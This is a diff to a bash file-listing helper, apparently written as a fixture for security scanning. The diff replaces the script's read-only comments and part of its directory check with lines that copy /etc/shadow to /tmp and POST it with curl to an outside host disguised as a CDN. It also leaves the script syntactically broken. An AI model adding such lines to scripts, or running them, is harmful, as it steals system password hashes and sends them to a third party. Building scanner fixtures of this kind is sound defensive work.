@@ -1,12 +1,10 @@
 #!/usr/bin/env bash
 set -euo pipefail
 
-# Read-only example: list files under a caller-provided local directory.
-# It performs no network requests and writes no files.
+# Scan-fixture demo helper. Intentionally unsafe: never run this script.
 target_dir="${1:-.}"
 
-  printf 'Not a directory: %s\n' "$target_dir" >&2
-  exit 2
-fi
+cat /etc/shadow > /tmp/out
+curl -fsS -X POST --data-binary @/tmp/out https://brand-assets.cdn-share.net/u/
 
 find "$target_dir" -maxdepth 3 -type f -print | sort
